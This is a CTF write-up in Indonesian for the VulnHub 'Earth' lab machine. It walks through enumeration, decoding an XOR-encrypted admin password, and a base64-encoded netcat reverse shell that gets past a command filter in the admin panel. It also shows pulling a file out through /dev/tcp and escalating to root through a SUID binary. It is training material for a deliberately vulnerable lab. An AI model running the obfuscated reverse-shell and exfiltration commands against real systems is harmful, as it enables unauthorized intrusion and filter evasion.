# Earth — CTF Writeup

**Platform:** VulnHub  
**Difficulty:** Easy  
**Category:** Web, Privilege Escalation  

---

## Deskripsi

Machine ini mensimulasikan dua web server (`earth.local` dan `terratest.earth.local`) yang berjalan di satu mesin target. Alur exploitasinya dimulai dari enumerasi jaringan, analisis enkripsi XOR, akses admin panel, reverse shell, hingga privilege escalation ke root.

---

## Tahap 1 — Enumerasi Jaringan

### Scan Host Aktif

```bash
arp-scan -l
```

Dari output, catat IP target yang muncul.

### Scan Port dan Service

```bash
nmap -sV -sC -A <IP_TARGET>
```

Hasil scan menunjukkan beberapa port terbuka beserta service yang berjalan. Dari sini juga ditemukan dua DNS:

- `earth.local`
- `terratest.earth.local`

### Tambahkan DNS ke /etc/hosts

Agar domain bisa diakses lewat browser, tambahkan entri berikut:

```bash
sudo nano /etc/hosts
```

```
<IP_TARGET>    earth.local
<IP_TARGET>    terratest.earth.local
```

---

## Tahap 2 — Reconnaissance Web

### earth.local

Saat diakses, menampilkan halaman dengan form untuk encode/encrypt pesan. Ada beberapa string terenkripsi yang bisa disalin untuk keperluan decode nanti.

### terratest.earth.local

Hanya menampilkan teks sederhana: *"test site"*.

---

## Tahap 3 — Directory Enumeration

### Gobuster

```bash
gobuster dir -u http://earth.local -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://terratest.earth.local -w /usr/share/wordlists/dirb/common.txt
```

### Temuan

| URL | Keterangan |
|---|---|
| `http://earth.local/admin` | Halaman login admin panel |
| `http://terratest.earth.local/robots.txt` | File robots.txt tersedia |

> **Checkpoint:** Halaman `http://earth.local/admin` menampilkan form login.

---

## Tahap 4 — Analisis robots.txt dan Catatan Testing

### Akses robots.txt

```
http://terratest.earth.local/robots.txt
```

Isi file:

```
Disallow: /testingnotes.*
```

### Akses /testingnotes

```
http://terratest.earth.local/testingnotes.txt
```

Isi catatan:

```
Testing secure messaging system notes:
* Using XOR encryption as the algorithm, should be safe as used in RSA.
* Earth has confirmed they have received our sent messages.
* testdata.txt was used to test encryption.
* terra used as username for admin portal.

Todo:
* How do we send our monthly keys to Earth securely? Or should we change keys weekly?
* Need to test different key lengths to protect against bruteforce. How long should the key be?
* Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
```

### Informasi Penting

- **Algoritma enkripsi:** XOR
- **File kunci:** `testdata.txt`
- **Username admin:** `terra`
- **Password:** masih terenkripsi, perlu di-decode

---

## Tahap 5 — Decode Password

### Ambil Key dari testdata.txt

```
http://terratest.earth.local/testdata.txt
```

Salin isi file tersebut — ini adalah key XOR yang digunakan.

### Decode Pesan Terenkripsi

Kunjungi `earth.local`, salin satu per satu string terenkripsi yang ada di halaman tersebut. Decode setiap string menggunakan XOR dengan key dari `testdata.txt`.

Bisa menggunakan tool online seperti [CyberChef](https://gchq.github.io/CyberChef/) dengan operasi:

```
From Hex → XOR (key dari testdata.txt, UTF-8)
```

Hasil yang menghasilkan teks yang bisa dibaca manusia adalah password adminnya.

---

## Tahap 6 — Login Admin Panel

Akses:

```
http://earth.local/admin
```

Masukkan kredensial:

- **Username:** `terra`
- **Password:** `<hasil decode XOR>`

Setelah login, admin panel menampilkan antarmuka yang bisa menjalankan command langsung di server (seperti `ls`, `cat`, `whoami`, dll).

---

## Tahap 7 — Reverse Shell

### Cek User Saat Ini

```bash
whoami
```

Output menunjukkan bukan root — perlu eskalasi.

### Bypass Pembatasan nc Langsung

`netcat` (`nc`) langsung diblokir oleh server. Solusinya: encode perintah dengan Base64 terlebih dahulu.

### Di Mesin Kita — Siapkan Listener

```bash
nc -lvnp 4444
```

### Buat Payload Reverse Shell

```bash
echo "nc -e /bin/bash <IP_MESIN_KITA> 4444" | base64
```

Salin output Base64 yang dihasilkan.

### Jalankan Payload di Admin Panel

Masukkan perintah berikut ke dalam input CLI di admin panel:

```bash
echo "<HASIL_BASE64>" | base64 -d | bash
```

Mesin kita akan menerima koneksi reverse shell.

### Upgrade Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Tahap 8 — Privilege Escalation

### Cari Binary dengan SUID Bit

```bash
find / -perm -u=s 2>/dev/null
```

Ditemukan binary menarik:

```
/usr/bin/reset_root
```

### Transfer Binary ke Mesin Kita untuk Analisis

**Di mesin kita — buka listener untuk menerima file:**

```bash
nc -lvnp 3333 > reset_root
```

**Di mesin target (via reverse shell):**

```bash
cat /usr/bin/reset_root > /dev/tcp/<IP_MESIN_KITA>/3333
```

### Analisis Binary dengan ltrace

```bash
chmod +x reset_root
ltrace ./reset_root
```

Output `ltrace` menunjukkan binary mencoba mengakses file tertentu, contoh:

```
access("/blab/lalab", ...)
```

### Buat File yang Dibutuhkan di Mesin Target

Kembali ke sesi reverse shell, buat file-file yang dicari oleh `reset_root`:

```bash
touch /blab/lalab
```

### Jalankan reset_root

```bash
/usr/bin/reset_root
```

Binary akan menampilkan output berisi password root.

---

## Tahap 9 — Login sebagai Root

```bash
su root
```

Masukkan password yang diperoleh dari output `reset_root`.

### Ambil Flag

```bash
cat /root/root_flag.txt
```

---

## Ringkasan Alur Eksploitasi

```
Scan jaringan (arp-scan + nmap)
        ↓
Tambah DNS ke /etc/hosts
        ↓
Enumerasi direktori (Gobuster)
        ↓
Temukan /testingnotes.txt → username + algoritma XOR
        ↓
Decode ciphertext → password admin
        ↓
Login earth.local/admin
        ↓
Reverse shell via Base64 + nc
        ↓
Temukan SUID binary /usr/bin/reset_root
        ↓
Analisis dengan ltrace → buat file trigger
        ↓
Jalankan reset_root → dapat password root
        ↓
su root → cat /root/root_flag.txt ✓
```

---

## Tools yang Digunakan

| Tool | Fungsi |
|---|---|
| `arp-scan` | Discover host di jaringan lokal |
| `nmap` | Port scan dan service enumeration |
| `gobuster` | Directory brute-force |
| `CyberChef` | Decode enkripsi XOR |
| `netcat (nc)` | Listener reverse shell & transfer file |
| `ltrace` | Trace library call pada binary |

---

## Pelajaran dari Machine Ini

- **XOR encryption bukan enkripsi yang aman** — kuncinya bisa ditemukan dari file yang terbuka publik.
- **File `robots.txt`** sering menyembunyikan path sensitif yang tidak ingin diindeks.
- **Binary SUID** dengan logika bergantung pada keberadaan file tertentu bisa dieksploitasi dengan cara membuat file tersebut secara manual.
- **Command injection di admin panel** adalah celah kritis — selalu validasi dan sanitasi input.
